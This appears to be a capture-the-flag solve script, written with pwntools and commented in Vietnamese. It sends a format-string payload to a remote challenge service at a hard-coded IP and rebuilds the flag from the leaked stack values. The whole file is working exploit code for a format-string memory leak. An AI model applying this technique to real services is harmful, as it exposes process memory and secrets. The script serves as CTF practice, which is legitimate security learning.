from pwn import *

p = remote('43.205.113.100', 8185)

p.sendlineafter(b'(Y/n)', b'Y')

# Payload tập trung vào các offset chứa flag
# Leak từ 10 đến 22 để chắc chắn lấy hết
payload = b""
for i in range(10, 23): # Lấy từ 10 đến 22
    payload += f"%{i}$p.".encode()

print("Sending final payload:", payload)
print("Payload length:", len(payload))

p.sendlineafter(b'What was your name again?', payload)

# Nhận output
p.recvuntil(b'working with you ')
try:
    leaked_data_str = p.recvall().decode().strip() # Dùng recvall để lấy hết
except EOFError:
    leaked_data_str = p.buffer.decode().strip() # Lấy từ buffer nếu có lỗi

print(f"\nLeaked raw string: {leaked_data_str}")

# Tách các phần hex ra
parts = leaked_data_str.split('.')
flag = ""

# Ghép các phần đã decode lại
for part in parts:
    hex_val = part.replace('0x', '')
    if len(hex_val) > 1 and hex_val != '(nil)':
        try:
            decoded_bytes = bytes.fromhex(hex_val)
            reversed_bytes = decoded_bytes[::-1] # Little-endian
            flag += reversed_bytes.decode('latin-1')
        except (ValueError, UnicodeDecodeError):
            pass # Bỏ qua nếu không decode được

print("\n--- RECONSTRUCTED FLAG ---")
print(flag)

p.close()